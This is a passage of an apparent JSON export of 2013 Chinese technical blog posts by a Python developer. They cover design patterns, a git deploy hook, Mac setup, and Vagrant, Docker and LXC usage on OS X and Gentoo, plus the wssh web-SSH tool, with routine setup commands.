当你初学python，可能还是翻阅手册或者去google出一些你想要问题的答案，而后举一反三修改它符合你想要的东西。那么这是阶段一：堆代码，这个时候主要是为了实现功能，不重视代码编码规范，代码运行效率，代码可读性等\n\n* 用过一段时间python，你对python很熟悉了，可以copy代码写东西了。那么这是阶段二：码农初长成\n\n* 我是这样的人：当一个类似的功能出现，我就想思考重构(重构这个词太大了，好吧，为了减少我的代码量);当经常出现某些相同的情况的过程，我就会思考更好的抽象出来;当项目大了，、\n会思考如何在不改动或者少改动的前提下更好的扩展新功能。那么这是阶段三: 码农中的愤青 这里你会对自己有更高的要求，其实总结一些更好的表达和实现，就是设计模式了\n\n* 埋头写代码毕竟进步有限，这个时候可能你会读一些好的开源代码，保存了很多别人的代码片段等，你会发现:哦，原来可以这么写.. 哇 这个实现好酷... 然后你会记下来，\n等以后在合适的场景里面借用这些思想, 这是阶段四：在很多开源代码中会看见一些很好的设计模式的体现，就是这样看别人，然后理解吸收\n\n####如何学习python的设计模式\n\ngithub上面有2个这方面的项目: [python-patterns](https://github.com/faif/python-patterns)和[Design-Patterns-in-Python](https://github.com/gennad/Design-Patterns-in-Python), 但是都不怎么维护了\n当然了，做广告,可以看我的GithubPages[小明明s Github - 设计模式](http://dongweiming.github.io/category/she-ji-mo-shi.html),都是我自己的理解，欢迎大家提意见\n\n####python的设计模式\n\n通过我学习和写这些模式的文章，我有很多感悟\n\n* 对于python，装饰器模式其实都已经是内置代码级别;\n\n* [flyweight模式](http://dongweiming.github.io/python-flyweight.html)原来还可以这样玩;\n\n* [单例模式](http://dongweiming.github.io/python-singleton.html)已经落伍，完全可以被[borg模式](http://dongweiming.github.io/python-borg.html)取代\n\n* [NUll模式](http://dongweiming.github.io/python-null.html)可以帮助你省去很多代码和异常处理\n\n* [对象池模式](http://dongweiming.github.io/python-object-pool.html)是一个很实用的模式\n\n* 终于理解游戏人物设计用到了[原型模式](http://dongweiming.github.io/python-pototype.html)\n\n...\n\n基本是学了每个模式都有很深的触动\n\n####学习设计模式有没有必要\n\n没有学习设计模式不会影响你写代码的水平，但是学习了会提高你的代码质量和拓宽你解决问题的思路\n\n\n",
    "date": {
      "year": "2013",
      "month": "June",
      "day": "17"
    }
  },
  {
    "id": 270,
    "title": "自搭建git服务器实现提交代码自动推到测试环境",
    "category": "git",
    "tags": [
      "git hooks"
    ],
    "url": "/archives/zi-da-jian-gitfu-wu-qi-shi-xian-ti-jiao-dai-ma-zi-dong-tui-dao-ce-shi-huan-jing/",
    "content": "####前言\n\n假如公司有很多项目，很可能你要自建git服务器，然后有不同的分支管理各个项目。尤其是web开发，每次push不仅在测试环境需要pull代码，\n可能还有nginx，uwsgi，supervisor等都需要重启。那么有没有什么办法让你在push代码的时候触发这一系列的重新部署呢？\n\n####思路和例子\n\n假设你的开发分支是feature_example_develop(你要是在master分支直接push也可以，呵呵)有A，B，C等等同事都会往这个分支提交东西\n测试环境的IP为192.168.22.34\n\n1. 在你的git版本库的hooks里面这些修改post-update(表示代码提交到版本库后触发)\n\n```\n#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n\n# 获取本次提交的分支名字\nbranch=$(git rev-parse --symbolic --abbrev-ref $1)\n        \ncase \"$branch\" in\n    feature_example_develop)\n        echo This is a develop push\n        # 远程执行测试环境下的sync_develop_code.sh脚本\n        ssh dongwm@192.168.22.34  -p 9922 \"source sync_develop_code.sh\"\n        ;;\n    master)\n        echo This is a master push\n        ;;\n    *)\n        echo This is only some push ops.\n        ;;\nesac\n\nexec git update-server-info\n```\n\n1. 测试环境的更新环境脚本 sync_develop_code.sh\n\n```\n#! /bin/bash\n# 切换到git版本库目录下\ncd /home/dongwm/test_develop\n# '拉'下最新代码\ngit pull origin feature_example_develop\n# 重启supervisor管理的进程\nsudo supervisorctl -c /home/dongwm/test_develop/server/supervisor_develop.conf restart all\n# 重启uwsgi\nsudo /etc/init.d/uwsgi restart\n```\n\n####一个很重要的问题\n\npost-update不会检查你的代码是不是有问题，当提交了错误的代码会造成测试环境问题\n解决办法：修改update钩子-在提交前对你设置的操作的执行的$?做判断-非0就会拒绝你的提交，在这个时候你可以做pylint/coverage/nosetests等，下次我再说我做的这个工作\n",
    "date": {
      "year": "2013",
      "month": "June",
      "day": "17"
    }
  },
  {
    "id": 271,
    "title": "python程序员Mac初始化环境",
    "category": null,
    "tags": [

    ],
    "url": "/archives/pythoncheng-xu-yuan-macchu-shi-hua-huan-jing/",
    "content": "####前言\n\n早就想总结一篇python程序员的Mac配置笔记，趁这次就写一下我初始化的一些实践\n\n####安装Xcode, Command line tools\n\n作为开发者，肯定需要gcc,clang这些环境，Xcode界面也能下载Command line tools，但是下载好几次都有签名错误的问题，直接去官网下载\n\n使用浏览器下载一段时间锁屏会停止下载，又不能续传。所以我还是习惯命令行下载.可以在这里找到https://github.com/orzrd/mytools/blob/master/adc_download.sh\n比如下载xcode:\n\n```\n./adc_download.sh http://adcdownload.apple.com/Developer_Tools/xcode_4.6.3/xcode4630916281a.dmg\n```\n\n####安装git\n\n在这里 http://git-scm.com/download/mac，但是你需要注意[版本和你的os的版本的对应关系](http://support.apple.com/kb/ht1633?viewlocale=zh_CN)\n\n####安装brew-包管理工具\n\n##### 以后我通过brew安装的软件都放在这个目录\n\n```\nsudo chown -R `whoami` /usr/local\ngit init\ngit remote add origin git://github.com/mxcl/homebrew.git\ngit pull origin master\n```\n\n####安装一些常用工具\n\n```\nbrew install wget the_silver_searcher tree tmux htop mysql autojump mongodb zsh-completions\nsudo easy_install pip\nsudo pip install virtualenv\nsudo pip install virtualenvwrapper\n# 设置mysql和mongodb开机自启动\nln -sfv /usr/local/opt/mysql/*.plist ~/Library/LaunchAgents \niln -sfv /usr/local/opt/mongodb/*.plist ~/Library/LaunchAgents\n```\n\n####安装配置oh-my-zsh和dotfiles\n\n\n```\ngit clone https://github.com/robbyrussell/oh-my-zsh.git .oh-my-zsh\nchsh -s /bin/zsh\ngit clone https://github.com/dongweiming/dotfiles.git ~/dotfiles\ncd dotfiles\n./install.sh vim\n```\n\n####配置一个虚拟python环境\n\n```\nexport WORKON_HOME=~/envs\nmkdir $WORKON_HOME -p\nsource /usr/local/bin/virtualenvwrapper.sh\nmkvirtualenv --no-site-packages XXX # 这里新建了一个叫做XXX的环境,并且不会依赖site-package，需要你在环境中自定义下载\npip install -r requirements.txt #根据文件安装依赖\n```\n\n##### zshrc的配置可以看我的[dotfiles](https://github.com/dongweiming/dotfiles/blob/master/_zshrc)，我粘贴出来\n\n```\nexport ANTIGEN_DEFAULT_REPO_URL=https://github.com/dongweiming/oh-my-zsh       \nsource ~/dotfiles/antigen/antigen.zsh                                          \n                                                                               \nantigen use oh-my-zsh                                                          \n                                                                               \nif [ \"${OSTYPE:0:6}\"=\"darwin\" ]; then                                          \n  antigen-bundle osx                                                           \n  antigen-bundle brew                                                          \n  export PATH=$(brew --prefix ruby)/bin:$PATH:/usr/local/sbin:~/bin\nelse                                                                           \n  export PATH=$PATH:~/bin                                                      \nfi                                                                             \nantigen bundles <<EOB                                                          \n  git-extras                                                                   \n  pip                                                                          \n  python                                                                       \n  autojump\n  django                                                                       \n  ruby                                                                         \n  git-flow                                                                     \n  virtualenvwrapper                                                            \n  git                                                                          \n  github                                                                       \n  supervisor                                                                   \n  tmux                                                                         \n  vagrant                                                                      \n  history                                                                      \n  zsh-users/zsh-syntax-highlighting                                            \n  zsh-users/zaw                                                                \n  zsh-users/zsh-history-substring-search                                       \n  ~/.oh-my-zsh --no-local-clone                                                \nEOB                                                                            \n                                                                               \nantigen theme sheerun/oh-my-zsh-powerline-theme powerline                     \n                                                                               \nantigen apply                                                                  \n                                                                               \nautoload -U zmv                                                                \nexport SSH_ASKPASS=\"\"                                                          \nalias rake='noglob rake'                                                       \nexport WORKON_HOME=~/envs                                                      \nsource `which virtualenvwrapper.sh`                                            \nalias social='workon social;cd ~/social_master' \nalias ls='ls -hF --color=auto'\nsource ~/.oh-my-zsh/custom/powerline.zsh\nzstyle ':completion:*' list-colors \"${(s.:.)LS_COLORS}\"\n\nfor keycode in '[' 'O'; do\n  bindkey \"^[${keycode}A\" history-substring-search-up\n  bindkey \"^[${keycode}B\" history-substring-search-down\ndone\nunset keycode\n\n\n# bind k and j for VI mode\nbindkey -M vicmd 'k' history-substring-search-up\nbindkey -M vicmd 'j' history-substring-search-down\n```\n\n####安装coreutils\n\n##### Mac说白了就是freeBSD+一些插件的组合，所以常用工具例如ls 、grep也都是freeBSD版本,比如我使用rm删除文件,就必须rm -rf xx 而不能 rm xx -rf s实在脑残\n\n```\nbrew install coreutils\n```\n\n添加PATH到.zshrc\n\n```\nPATH=\"$(brew --prefix coreutils)/libexec/gnubin:$PATH\"                           \nMANPATH=\"$(brew --prefix coreutils)/libexec/gnuman:$MANPATH\"\n```\n\n####修改ls配色\n\n```\ngit clone git@github.com:seebi/dircolors-solarized.git\n# dircolors就在上面的coreutils中\necho 'eval `dircolors ~/lib/dircolors-solarized/dircolors.256dark`' >> ~/.zshrc\n```\n\n####安装octopress-为我的博客  仅供参考\n\n```\n# 默认的ruby是1.8.7的，我想要2.0的\nbrew install ruby\ngem install bundler\nbundle install\nbundle update rake #安装的版本和octoress要求的9.2.2要高，所以需要升级\ngit clone https://github.com/imathis/octopress.git oc\ncd oc\n# 为啥会有下面的一堆cp?其实是为了升级我的octopress\ncp ../octopress/Rakefile .\ncp ../octopress/_config.yml .\ncp -rp ../octopress/source .\n# 以下是我自己写的几个脚本\ncp ../octopress/plugins/pygments_code.rb plugins\ncp ../octopress/plugins/shjs.rb plugins\ncp ../octopress/plugins/tag_cloud.rb plugins\ncp ../octopress/sass . -rp\n# 然后你就可以生成了\nrake generate\n```\n",
    "date": {
      "year": "2013",
      "month": "June",
      "day": "22"
    }
  },
  {
    "id": 272,
    "title": "OSX下使用vagrant和docker管理创建虚拟环境",
    "category": "osx",
    "tags": [
      "osx",
      "docker",
      "vagrant"
    ],
    "url": "/archives/osxxia-shi-yong-vagranthe-dockerguan-li-chuang-jian-xu-ni-huan-jing/",
    "content": "####前言\n\n乍一看题目出现了好多名词，根据我的理解一一说来\n\n虚拟化: 其实就是因为云计算的催生的技术，目的是让运行在上面的应用程序觉得自己独占所有的资源。说白了就是资源管理/隔离和namspace的隔离.\n\nHypervisor: 这是虚拟化的一种,也就是操作系统上面在运行一个或者多个操作系统，这个底层的操作系统系统就是hypervisor.它来管理和分配那些创建的操作系统\n所需要的资源.这种虚拟化也可以分成2种:原生(直接将虚拟的操作系统运行在裸机上，比如kvm和xen,确定是需要特定的硬件支持)和宿生(软件层面的，比如我这里\n会用到的Virtualbox). 但是有个问题：运行了多个操作系统实例，开销很大，而且启动一个系统就要拿走一部分资源\n\nLXC(LinuX Containers):是一种操作系统层面的虚拟化技术.它只运行**一个内核**，一个虚拟的执行环境就是一个容器。可以为容器绑定特定的cpu和memory节点，\n分配特定比例的cpu时间、IO时间，限制可以使用的内存大小等.遗憾的是LXC只支持linux，不支持BSD，OSX，WINDOWS，所以我下面在我的Mac里面是通过\nVirtualbox生成容器的. 至于为什么选择LXC，我想除了开销小之外，就是方便快速的部署\n\n[Docker](http://www.docker.io): 是一种增加了高级API的LinuX Container（LXC）技术，来至[dotcloud](https://www.dotcloud.com), 官网这样描述:提供了能够独立运行Unix进程的\n轻量级虚拟化解决方案。它提供了一种在安全、可重复的环境中自动部署软件的方式.在[Infoq](http://www.infoq.com/cn/news/2013/04/Docker)你能找到主要特性，当然，3个月过去了，它肯定成长了很多\n\n[Vagrant](https://github.com/mitchellh/vagrant): 是一个ruby语言的工具. 用于创建和部署虚拟化开发环境. 我们使用Vagrant在VirtualBox的虚拟机里安装docker\n\n####什么系统来使用docker的一些想法\n\n用OSX本来就有点...额，太绕. 其实docker已经被ubuntu官方支持，添加docker的PPA然后安装.\n\n还可以把安装流程封装成Dockfile，用git做版本控制\n\n####谁需要学习本文\n\n我想运维同学会更需要一些.或者硬件资源缺乏的程序员们\n\n程序员倒是可以学习把开发的应用放在虚拟机里面做成模板，可以使用vagrant管理\n\n为什么这么说？要是为了不污染开发环境，我们python已经有个virtualenv+virtualenvwrapper.\n\n对我这种程序员来说，我不需要那么多虚拟机,其次是我还有物理机的测试环境，并且我们线上的操作系统相当一致. 这篇文章就是为了了解docker\n\n####安装Vagrant和Virtualbox\n\nvagrant就是基于[Virtualbox](https://www.virtualbox.org)的，你可以使用gem安装\n\n```\ngem install vagrant\n```\n\n我喜欢最新版，手动安装的\n\n```\nwget https://github.com/mitchellh/vagrant/archive/v1.2.2.tar.gz\ntar zxvf v1.2.2.tar.gz\ncd vagrant-1.2.2\nsudo gem install bundler\nbundle install\nrake install\n```\n\n####从github克隆docker\n\n```\ngit clone https://github.com/dotcloud/docker.git\ncd docker\nvagrant up\n```\n'vagrant up'其实就是调用了virtualbox的终端接口打开你的虚拟机，类似下面的命令， 而不是你在界面点击'开始'\n\n\n```\n/Applications/VirtualBox.app/Contents/MacOS/VBoxHeadless --comment docker_1373340358 --startvm 6e4ea638-77b2-400d-9fbe-3b4e8d4fba21 --vrde config\n```\n\n这时候你在virtualbox的界面可以看见启动的虚拟机,名字就是上面的docker_1373340358\n\n在docker目录下已经有个一个Vagrantfile文件，你想想Makefile，意思很类似，其实为什么要这个docker源，\n很大原因就是要用这个文件，因为它已经配置好了默认你要是用的box文件,类似执行了下面的命令\n\n```\nvagrant init ubuntu http://files.vagrantup.com/http://files.vagrantup.com/precise64.box\n.... #一些配置\nvagrant up\n```\n\n首先说这里可能会报错,类似这个网页粘贴的[内容](http://wklej.org/id/836076/txt)， 内容有类似提示\n\n```\nINFO interface: error: There was an error executing the following command with\nVBoxManage:\n\n[\"import\", \"C:/Users/kwladyka/Desktop/My Dropbox/Vagrant/vagrant.d/boxes/base/bo\nx.ovf\"]\n\nFor more information on the failure, enable detailed logging with\nVAGRANT_LOG.\n```\n\n解决办法是:\n\n```\ncd /Users/dongwm/.vagrant.d/boxes/ubuntu/virtualbox/\nopenssl sha1 *.vmdk *.ovf > box.mf\ncd -\n```\n\n但是官网说这样会自动帮我们增加docker的PPA，更新源再安装lxc-docker，可是没有出现，我后来都是自己去执行的,如下\n\n为什么用这个box？当然了其它系统都可以，你可以下载其它的虚拟机镜像，再安装其系统下的lxc-docker(我会准备一篇gentoo版本的文章)\n\n####登录虚拟机\n\n```\nvagrant ssh\n```\n\n其实通过2222的端口转发登录了虚拟机的22端口，实际命令类似这样:\n\n```\nssh vagrant@127.0.0.1 -p 2222 -o LogLevel=FATAL -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o \nIdentitiesOnly=yes -i /Users/dongwm/.vagrant.d/insecure_private_key\n```\n\n####我自己安装lxc-docker的方法\n\n```\nsudo apt-get install python-software-properties\nsudo add-apt-repository ppa:dotcloud/lxc-docker\nsudo apt-get update\nsudo apt-get install lxc-docker\n```\n\n####生成容器(虚拟机)并且创建一个sshd进程，以便使用者链接这个虚拟机\n\n官网说的下载dhrp/sshd这个容器，但是我费了半天劲下载后报神奇的404...后来我在换了另外一个,这个pull其实就是去下载一个已经\n被别人做好的实现某种功能的虚拟机，然后你使用这个实现基本功能的虚拟机，提交你的修改就变成你定制的版本了,当然你可以自己做一个容器\n\n```\ndocker pull base  #pull基本的ubuntu镜像 \ndocker run -i -t base /bin/bash #-i表示进入交互模式，-t为启动一个终端，其实就是根据base镜像进入一个容器\nroot@4a61c288be0f:/# apt-get update && apt-get install openssh-server #注意前面的PS，root权限，进入了这个容器，需要先安装sshd\nroot@4a61c288be0f:/# mkdir /var/run/sshd #要不然启动不了sshd\nroot@4a61c288be0f:/# /usr/sbin/sshd #启动sshd进程，不同的系统可能位置不同\nroot@4a61c288be0f:/# passwd #设置root密码,以后要ssh登录滴\nroot@4a61c288be0f:/# exit #退出容器 但是记住前面PS的一排随机号码 这里是4a61c288be0f\ndocker ps -a |less #查看都有那些容器,也能看见上面的\ndocker commit 4a61c288be0f dongweiming/sshd #这里的commit号码就是刚才记住的. 这样状态保存到dongwm/sshd,以后就不用下载openssh-server,设置root密码了\n```\n\n想要简单的话直接这样嘛....\n\n```\ndocker pull johnfuller/sshd\ndocker run -i -t johnfuller/sshd /bin/bash\nroot@2fd1aabac314:/# /usr/sbin/sshd\nroot@2fd1aabac314:/# passwd\nroot@2fd1aabac314:/# exit\ndocker commit 2fd1aabac314 dongweiming/sshd\n```\n\n这里有个STATUS列，退出码有0，1，2，127等,验证你的容器正常运行,后面还有PORTS列，要是sshd启动了就会显示的\n\n####启动容器,用我自己的sshd容器\n\n```\nrst=$(docker run -d dongwm/sshd -p 22 /usr/sbin/sshd -D) #执行这个会返回类似的字符数字串\ndocker ps #你会发现它启动了\nport=$(docker port $rst 22) #这会显示在实际的虚拟机的这个容器专用的端口\n```\n\n####ssh链接这个容器\n\n```\nifconfig #找你本机的ip\nssh root@192.168.33.10 -p $port #port 好像默认从49153开始 这样输入root密码就登录进去了\n```\n\nOK了 就是这样，然后当然你可以为这个虚拟机和你本机(注意三个关键词:本机(我的Mac),虚拟机(vagrant创建的vbox),容器(在vbox中创建的虚拟机，虚拟机中的虚拟机))\n\n####把你的源push到docker,需要你注册. 可以被别人用，当然了 目前来说没啥用\n\n```\ndocker login\ndocker push dongweiming/sshd  #要确保这个源没有被用,我这里是dongweiming和 dongweiming/sshd\n```\n\n这样你以后想找个sshd的源,就可以这样\n\n```\ndocker pull dongweiming/sshd\n```\n\n但是这里面还是有很多其他的东西,往下看\n\n####端口转发\n\n你想，你这是在虚拟机里面创建了一堆容器，他可以连接本机，甚至上网，但是你不能直连到它，那么这时候就需要神奇的端口转发,\n将你本机的端口的数据转发到这个vbox的端口，然后就可以看起来直连了,其实人家已经实现了\n\n回到最上面的Vagrantfile，就是docker的根目录下.最后面\n\n```\nif !FORWARD_DOCKER_PORTS.nil?                                                  \n    Vagrant::VERSION < \"1.1.0\" and Vagrant::Config.run do |config|             \n        (49000..49900).each do |port|                                          \n            config.vm.forward_port port, port                                  \n        end                                                                    \n    end                                                                        \n                                                                               \n    Vagrant::VERSION >= \"1.1.0\" and Vagrant.configure(\"2\") do |config|         \n        (49000..49900).each do |port|                                          \n            config.vm.network :forwarded_port, :host => port, :guest => port   \n        end                                                                    \n    end          \n```\n\n什么意思呢?其实你在本机的环境变量设置了FORWARD_DOCKER_PORTS，默认就会把49000..49900端口转发开启\n\n```\nexport FORWARD_DOCKER_PORTS=True，然后再vagrant up\n```\n\n####其他系统镜像\n\n不知道你有没有注意,我们在OSX上面安装的虚拟机是ubuntu的，在里面使用docker管理的容器也是ubuntu的，假如想用其他的操作系统容器呢?\n\n比如找debian的,你可以使用\n\n```\ndocker search debian\n```\n\n或者在docker的索引网站搜索\n\n```\nhttps://index.docker.io\n```\n\n我选择了 tianon/debian\n\n```\ndocker pull tianon/debian\n```\n\n比如还是刚才的ssh, -t 就不指base 而是tianon/debian\n\n```\ndocker run -i -t tianon/debian  /bin/bash\n```\n\n####使用docker创建一个python的web环境，这里用我写的[flask_reveal](https://github.com/dongweiming/flask_reveal)\n\n上面说的是一个容器,当你有了root权限想要安装什么都可以，对我来说还可以设置一个专为某应用设置的环境,根据官网的说明\n\n```\ndocker pull dongweiming/sshd #一个构建python的web环境的镜像,根据上面的sshd我加的一些脚本在里面,然后下载了curl,python-pip等构建了一个环境\nURL=https://github.com/dongweiming/flask_reveal/archive/v1.0.tar.gz #这是我提供的release版本\nBUILD_JOB=$(docker run -d -t dongweiming/sshd:latest /usr/local/bin/buildapp $URL) #其实就是创建一个容器,下载这个tar.gz安装包\n# 解压，进入目录下 格局需要安装依赖pip install -r requirements.txt\ndocker attach $BUILD_JOB #因为刚才的任务就是下载解压你可以这样去查看这个任务的执行过程\nBUILD_IMG=$(docker commit $BUILD_JOB reveal) #把刚才的下载提交后commit到新的镜像 取名reveal.这里请注意[commit](http://docs.docker.io/en/latest/commandline/command/commit)的用法,\n# 加'-run'可以运行你想的某种/些服务,设置内存，主机名，端口转发，dns，环境变量等\nWEB_WORKER=$(docker run -d -p 5000 $BUILD_IMG /usr/local/bin/runapp) #应用跑起来,这个runapp是我自己写的,启动mongodb, 根据我的reveal启动的流程\ndocker logs $WEB_WORKER #可以查看manage.py已经启动了\nWEB_PORT=$(docker port $WEB_WORKER 5000) #使用虚拟机的一个端口映射到这个容器的5000端口\nhttp://127.0.0.1:$WEB_PORT #好吧 你可以通过本机访问了\n```\n\n\n\n\n\n\n",
    "date": {
      "year": "2013",
      "month": "July",
      "day": "09"
    }
  },
  {
    "id": 273,
    "title": "gentoo下的lxc和docker",
    "category": "lxc",
    "tags": [
      "docker",
      "lxc"
    ],
    "url": "/archives/gentooxia-de-lxche-docker/",
    "content": "####前言\n\n上次就说要写一篇gentoo下安装使用docker的文章，顺便也学习了下gentoo下的lxc，记录下来\n\n####升级你的内核\n\ndocker要求升级到3.8以上的内核,假如你的已经是3.8.XX,那么你就要重新编译内核,参看[Wiki](http://wiki.gentoo.org/wiki/LXC)\n很多人比较怕编译内核，一看那个启动的简陋的页面就不知道该干什么了,出现问题不知道该去选择什么或者去掉什么选项.我来说一些小窍门,简单的说就是\n根据提示去内核界面按'/'搜索这个参数，根据提示的位置找到那个项\n\n问题1: 假如符合项很多怎么判断那个是真正要我选择的呢?\n\n回答: 首先是上下文的判断，一般的情况都是符合某写关键字的项都是某项和它的子项，当你去掉其父项，子项的选项也就消失了，还有个使用的经验的积累.\n比如下面的提示:\n\n```\n*   CONFIG_NETFILTER_XT_MATCH_ADDRTYPE:  is not set when it should be.\n```\n\n意思就是提示你\"NETFILTER_XT_MATCH_ADDRTYPE\", 没有设置，然后你使用/输入\"NETFILTER_XT_MATCH_ADDRTYPE\",回车，会显示类似下面的东西:\n\n```\n Search Results ─────────────────────────────┐\n  │ Symbol: NETFILTER_XT_MATCH_ADDRTYPE [=n]                                │  \n  │ Type  : tristate                                                        │  \n  │ Prompt: \"addrtype\" address type match support                           │  \n  │   Defined at net/netfilter/Kconfig:798                                  │  \n  │   Depends on: NET [=y] && INET [=y] && NETFILTER [=y] && NETFILTER_XTAB │  \n  │   Location:                                                             │  \n  │     -> Networking support (NET [=y])                                    │  \n  │       -> Networking options                                             │  \n  │         -> Network packet filtering framework (Netfilter) (NETFILTER [= │  \n  │           -> Core Netfilter Configuration                               │  \n  │ (1)         -> Netfilter Xtables support (required for ip_tables) (NETF │ \n```\n\n注意其中的'Prompt',他是帮助你在实际找对应项判断主题的关键字,'Location'告诉你它的位置是\n'Networking support'下的'Networking options'子项下的'Network packet filtering framework'...\n\n问题2： 为什么我选择了这个项依然还是没有显示成功，比如上面'NETFILTER_XT_MATCH_ADDRTYPE [=n]' n就是no，y就是yes\n一个严重的问题就是某项其实会有很多依赖，只有这些依赖都是'y'的时候它才生效.比如lxc要求的'USER_NS',\n默认内核中是没有显示出来的,原因是存在很多依赖和他冲突，必须去掉那些项他才会显示, 你打开它的搜索去看还有那个依赖还是'n'.\n这个过程可能好几次，直到最后，就显示了UIDGID_CONVERTED的bool值为n，这个时候你就要去看这个内核参数的依赖,打开/usr/src/linux/init/Kconfig,\n找到依赖挨个去掉，直到能显示\n\n\n####安装docker\n\n[tianon](https://github.com/tianon/gentoo-overlay)做好了一个docker的overlay源，而且docker的gentoo镜像也是他贡献的，感谢.\n把三方layman增加到你的gentoo系统在以前的[我维护的colout](http://www.dongwm.com/archives/wo-wei-hu-de-colout)说过就不说了,假设这里你已经添加了tianon的源\n\n然后安装\n\n```\nsudo emerge app-emulation/lxc-docker\n```\n\n这个依赖过程当然也会安装lxc\n\n因为docker依赖aufs,但是安装aufs的时候出现问题，我还记得一句:\n\n```\nYou need to apply a patch to your kernel to compile and run the aufs3 module\n```\n\n然后就异常退出了,看了下源码也的确有这些patch,当我手动打了第一个patch,依然报错...只能一个个的补丁手动打进去？\n看它的ebuild,有这样一行:\n\n```\nIUSE=\"debug doc fuse hfs inotify kernel-patch nfs pax_kernel ramfs\"\n```\n\n可是kernel-patch没有起作用,那么你在你的/etc/make.conf的USE里面添加'kernel-patch'就好了\n\n####增加docker0网卡\n增加一个配置，这个配置也是创建容器可选的配置，都放在/etc/lxc目录下\n\ncat /etc/lxc/guest.conf\n\n```\nlxc.network.type = veth\nlxc.network.flags = up\nlxc.network.link = docker0\n```\n\n####启动docker\n\n```\ndocker -d &\n```\n当提示类似:\n\n```\n2013/07/13 13:36:46 Listening for HTTP on 127.0.0.1:4243 (tcp)\n```\n\n表示搞定了\n\n\n但是我这里出现了一个报错\n\n```\niptables v1.4.16.3: can't initialize iptables table `nat': Table does not exist (do you need to insmod?)\n```\n\niptables的版本够高，但是很明显还是内核模块的问题，查看下,果然如此\n\n```\nlocalhost ~ # zgrep NF_NAT /proc/config.gz\n# CONFIG_NF_NAT_IPV4 is not set\n# CONFIG_NF_NAT_IPV6 is not set\n```\n\n还是需要设置在重新编译内核,重启生效\n\n\n####使用lxc\n\n比如我想创建个debian的容器\n\n```\nemerge dev-util/debootstrap #不同的系统依赖不同的这个包，比如fedora/centos就是sys-apps/yum, arch就是sys-apps/pacman...\nlxc-create -t debian -n debian_test #也可以加-p 指定配置文件 ，配置类似上面的guest.conf，可以配置ip之类\n# 假如想要ubuntu\n# lxc-create -t ubuntu -n ubuntu_test\n\n```\n这个时间会下载debian的基础镜像，包含一些基础的包\n\n你要设置root密码,比如我这个debian_test， 相关数据都在/etc/lxc/debian_test\n\n```\ncd /etc/lxc/debian_test\nchroot rootfs /bin/bash\n```\n\n然后登录设置密码\n\n启动和关闭容器的命令是 \n\n```\nlxc-start -n debian_test\nlxc-stop -n debian_test\n```\n\n当然你也可以设置个开机启动\n\n```\nln -s lxc /etc/init.d/lxc.debian_test\n/etc/init.d/lxc.debian_test stop\n/etc/init.d/lxc.debian_test start\nrc-update add lxc.debian_test default\n```\n\n还可以使用终端连接\n\n```\nlxc-console -n debian_test\n```\n\n####创建gentoo容器\n\n当我想创建gentoo的容器,可以借用[lxc-gentoo](https://github.com/globalcitizen/lxc-gentoo),它提供一个命令行的选择.简单粗暴，以下是一个例子\n创建一个ip为192.168.0.10，网关为192.168.0.1，容器叫做gentoo_test，主机名为test1的容器\n\n```\nsudo lxc-gentoo/lxc-gentoo create -i 192.168.0.10/26 -g 192.168.0.1 -n gentoo_test -u test1 \n```\n\n默认会把容器安装在执行命令的当前目录,这样启动\n\n```\nsudo /usr/sbin/lxc-start -f test1.conf -n gentoo_test\n```\n\n你也可以chroot进去， 为什么这样用？比如我经常用到的场景，我安装了gentoo/opensuse的双系统，可能我把其中一个系统玩坏(比如升级产生的问题，我安装或者卸载了某些东西等)\n，我就可以在没有u盘，livecd的前提下进入另外一个系统，chroot到这个系统去修复,而且不影响工作，因为我的很多目录之类都是软连接，修改一个地方切换另外的系统继续用\n\n```\nmount -t proc proc ./gentoo_test/proc\nmount -o bind /dev ./gentoo_test/dev\nchroot ./gentoo_test /bin/bash\nexport PS1=\"(gentoo_test) $PS1\"\n# 现在你就进来了,而不需要启动系统\n```\n\n####创建Archlinux容器\n\n我没有用gentoo的lxc自带的/usr/share/lxc/templates/lxc-archlinux,因为它根本用不了,并且存在以下一些问题:\n\n1. arch早已不用initscripts，改用systemd\n\n1. 安装基础系统不需要chroot到其系统,直接pacman指定系统根目录即可,并且它chroot进去指定根系统,那肯定永远也成功不了\n\n1. 在一个新的系统的pacman.conf没有指定XferCommand,那么也就不知道用什么下载了\n\n我新建个一个项目[gentoo-lxc-templates](https://github.com/dongweiming/gentoo-lxc-templates),目前包含了我修改的lxc-archlinux,我很少用arch,有问题欢迎pullme\n\n",
    "date": {
      "year": "2013",
      "month": "July",
      "day": "13"
    }
  },
  {
    "id": 274,
    "title": "使用http和websocket连接服务器",
    "category": "github",
    "tags": [
      "wssh",
      "websocket",
      "gevent",
      "flask",
      "paramiko"
    ],
    "url": "/archives/shi-yong-httphe-websocketlian-jie-fu-wu-qi/",
    "content": "####前言\n\n想想吧，通过网页ssh登录服务器是一件多么酷的事情?今天看了[使用浏览器访问 Linux 终端](http://www.vpsee.com/2013/06/invoke-a-linux-shell-with-ssh-account-from-browser),\n也就是这个[wssh](https://github.com/dongweiming/wssh),你也可以理解为websocket-ssh, 觉得有点意思就拿出来\n\n####原路\n\n它是一个库，很简单，作者写了2个flask+gevent+websocket+paramiko的例子，其中网页版的使用了bootstrap.\n简单的理解就是不通过ssh连接服务器，而是通过网页或者一个client请求url+相应参数调用\nshell到服务器的方式，但是遗憾的是作者一年没有再维护，bootstrap的网页竟然没有指定ssh端口的选项，但是很多时候为了安全\n都会把ssh端口换成其它端口，这样就不能用了,好吧 我动手给它加了这个功能，也提了pull request.目前大家可以用我的这版:[wssh](https://github.com/dongweiming/wssh)\n\n####**update**\n\nwssh作者已经合并了我的修改\n\n####使用说明\n\n当你使用\n\n```\nsudo python setup.py install\n```\n\n安装后，就能直接使用wssh和wsshd,wsshd是一个flask作为httpserver和gevent作为wsgi的服务端，默认启动在你本机的5000端口.\n网页登录就能看见简单大气的选项页面，可以指定用户，服务器ip，端口，以及使用密钥或者密码登录.输入点击连接就会登录到那台服务器,数据通过websocket实时显示到页面上\n\n\n而wssh是一个命令行登录的带选项的命令，其实就是页面输入的参数通过命令行的方式输入然后直接登录服务器，比如我下面的用法:\n\n```\nwssh dongwm@dongwm.com -p XXX -s 58404\n```\n\n####我觉得有空可以基于这个做点好玩的东西\n",
    "date": {
      "year": "2013",
      "month": "July",
      "day": "19"
    }
  },
  {
    "id": 275,
    "title": "一起学习common lisp吧",
    "category": "lisp",
    "tags": [
      "common lisp",
      "lisp_koans"
    ],
    "url": "/archives/%5B%3F%5D-qi-xue-xi-common-lispba/",
